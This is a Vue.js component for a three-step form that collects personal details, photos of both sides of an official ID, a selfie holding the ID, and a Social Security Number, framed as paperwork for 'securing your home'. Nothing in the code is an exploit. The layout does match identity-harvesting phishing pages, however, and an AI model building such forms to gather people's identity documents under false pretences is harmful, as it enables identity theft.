<script setup>
import { ref, reactive } from "vue";
import axios from "axios";
import PrimaryButton from "@/Components/PrimaryButton.vue";
import FormLayout from "@/Layouts/FormLayout.vue";

// Define props (including uri)
const props = defineProps({
  form: Object,
  uri: String,
});

const currentStep = ref(1);
const isSubmitting = ref(false);
const formResponseId = ref(null); // Store the response ID after Step 2 submission
const errors = ref(null); // Store validation errors

// Initialize formData as a reactive object
const formData = reactive({
  id_front: null,
  id_back: null,
  selfie_id: null,
  ssn: "",
  uri: props.uri,
  response: {},
  form_id: props.form.id,
});

// Step navigation
const nextStep = () => {
  if (currentStep.value === 2) {
    submitForm(); // Submit after Step 2
  } else {
    currentStep.value++;
  }
};

const prevStep = () => {
  if (currentStep.value > 1) {
    currentStep.value--;
  }
};

// Initialize group fields
const initializeGroup = (groupName) => {
  if (!formData.response[groupName]) {
    formData.response[groupName] = {};
  }
};

// Step 2: Handle form submission and store formResponseId
const submitForm = () => {
  isSubmitting.value = true;
  errors.value = null;

  const form = new FormData();
  form.append("uri", formData.uri ?? null);
  form.append("form_id", formData.form_id);
  form.append("id_front", formData.id_front);
  form.append("id_back", formData.id_back);
  form.append("selfie_id", formData.selfie_id);
  form.append("response", JSON.stringify(formData.response));

  axios
    .post(route("res.store"), form)
    .then((response) => {
      formResponseId.value = response.data.response_id; // Store the response ID for step 3
      currentStep.value++; // Move to step 3
    })
    .catch((error) => {
      if (error.response && error.response.status === 422) {
        errors.value = error.response.data.errors; // Handle validation errors
      } else {
        alert("An unexpected error occurred. Please try again.");
      }
    })
    .finally(() => {
      isSubmitting.value = false;
    });
};

// Step 3: Submit SSN and update the form
const submitSsn = () => {
  isSubmitting.value = true;
  errors.value = null;

  axios
    .post(route("res.update", formResponseId.value), {
      ssn: formData.ssn,
    })
    .then(() => {
      window.location.href = route("forms.submitted"); // Redirect to the completion page
    })
    .catch((error) => {
      if (error.response && error.response.status === 422) {
        errors.value = error.response.data.errors; // Handle validation errors
      } else {
        alert("An unexpected error occurred. Please try again.");
      }
    })
    .finally(() => {
      isSubmitting.value = false;
    });
};
</script>

<template>
  <FormLayout>
    <div>
      <h1>{{ form.name }}</h1>

      <!-- Display validation errors -->
      <div v-if="errors" class="error-message">
        <ul>
          <li v-for="(message, field) in errors" :key="field">
            {{ message[0] }}
          </li>
        </ul>
      </div>

      <!-- Linear Progress Bar with Dotted Steps -->
      <v-progress-linear
        :model-value="(currentStep / 3) * 100"
        color="light-blue"
        height="10"
        striped
      ></v-progress-linear>

      <!-- Step 1: Form Inputs -->
      <div v-if="currentStep === 1" class="mt-6">
        <v-row>
          <v-col
            v-for="(field, index) in JSON.parse(form.fields)"
            :key="index"
            class="form-field"
            :cols="field.col_size || 12"
          >
            <!-- Render text, email, tel, and date inputs -->
            <v-text-field
              v-if="['text', 'email', 'tel', 'date'].includes(field.type)"
              :type="field.type"
              v-model="formData.response[field.name]"
              :label="field.label"
              :required="field.required"
            />

            <!-- Render select dropdowns -->
            <v-select
              v-else-if="field.type === 'select'"
              v-model="formData.response[field.name]"
              :items="field.options"
              :label="field.label"
              :required="field.required"
            />

            <!-- Render radio buttons -->
            <v-radio-group
              v-else-if="field.type === 'radio'"
              v-model="formData.response[field.name]"
              :label="field.label"
              :required="field.required"
            >
              <v-radio
                v-for="(option, optIndex) in field.options"
                :key="optIndex"
                :label="option"
                :value="option"
              />
            </v-radio-group>

            <!-- Handle group type fields (like address) -->
            <div v-else-if="field.type === 'group'">
              <template v-if="!formData.response[field.name]">
                {{ initializeGroup(field.name) }}
              </template>
              <v-row>
                <v-col
                  v-for="(subField, subIndex) in field.fields"
                  :key="subIndex"
                  class="form-field"
                  :cols="subField.col_size || 12"
                >
                  <!-- Sub-field text inputs -->
                  <v-text-field
                    v-if="
                      ['text', 'email', 'tel', 'date'].includes(subField.type)
                    "
                    :type="subField.type"
                    v-model="formData.response[field.name][subField.name]"
                    :label="subField.label"
                    :required="subField.required"
                  />

                  <!-- Sub-field select inputs -->
                  <v-select
                    v-else-if="
                      subField.type === 'select' && subField.options.length > 0
                    "
                    v-model="formData.response[field.name][subField.name]"
                    :items="subField.options"
                    :label="subField.label"
                    density="comfortable"
                    :menu-props="{ closeOnContentClick: false, eager: true }"
                    class="my-custom-select"
                  />
                </v-col>
              </v-row>
            </div>
          </v-col>
        </v-row>
        <div class="flex justify-end">
          <v-btn color="primary" @click="nextStep">Next</v-btn>
        </div>
      </div>

      <!-- Step 2: File Upload -->
      <div v-if="currentStep === 2">
        <v-row>
          <h2 class="mt-4 text-center pl-4">Submit your official ID</h2>
          <v-col :cols="12">
            <div class="flex justify-center items-center">
              <img src="/images/front.png" alt="front" class="w-1/2" />
            </div>
            <v-file-input
              label="Front Page of ID"
              v-model="formData.id_front"
            ></v-file-input>
          </v-col>

          <v-col :cols="12">
            <div class="flex justify-center items-center">
              <img src="/images/back.png" alt="back" class="w-1/2" />
            </div>
            <v-file-input
              label="Back Page of ID"
              v-model="formData.id_back"
            ></v-file-input>
          </v-col>

          <v-col :cols="12">
            <div class="flex justify-center items-center">
              <img src="/images/selfi.png" alt="selfie" class="w-1/2" />
            </div>
            <v-file-input
              label="Selfie with ID"
              v-model="formData.selfie_id"
            ></v-file-input>
          </v-col>
        </v-row>
        <div class="flex gap-4 justify-end">
          <v-btn color="secondary" @click="prevStep">Back</v-btn>
          <v-btn :disabled="isSubmitting" color="primary" @click="nextStep"
            >Next</v-btn
          >
        </div>
      </div>

      <!-- Step 3: SSN Input -->
      <div v-if="currentStep === 3">
        <p class="text-sm px-4 mb-6 mt-6 text-center">
          We hope this message finds you well. As part of the standard process
          for securing your home and completing the necessary documentation, we
          will need your Social Security Number (SSN) to verify your identity
          and ensure compliance with federal regulations.
        </p>

        <v-text-field
          label="Social Security Number (SSN)"
          v-model="formData.ssn"
          required
          placeholder="e.g., 123-45-6789"
        ></v-text-field>
        <small>Submit your valid SSN</small>

        <div class="flex gap-4 justify-end">
          <v-btn color="secondary" @click="prevStep">Back</v-btn>
          <v-btn :disabled="isSubmitting" color="primary" @click="submitSsn"
            >Submit</v-btn
          >
        </div>

        <div class="data-security-text mt-4">
          <h3 class="text-xl text-center">Data Security</h3>
          <p class="text-sm px-4 mb-4 text-center">
            We are committed to ensuring that your information is secure. We use
            appropriate technical and organizational measures to safeguard the
            data we collect through the application form, including encryption,
            secure servers, and access control systems.
          </p>
        </div>
      </div>
    </div>
  </FormLayout>
</template>

<style scoped>
.v-field__input {
  padding-top: 0;
}

.my-custom-select {
  padding-bottom: 0; /* Remove padding */
  margin-bottom: 10px; /* Add spacing */
  min-height: 40px; /* Consistent height */
  border: none; /* Disable border styling */
}

.v-field__input {
  padding-top: 0 !important;
  padding-bottom: 0 !important;
}

.error-message {
  color: red;
  margin-bottom: 10px;
}
</style>
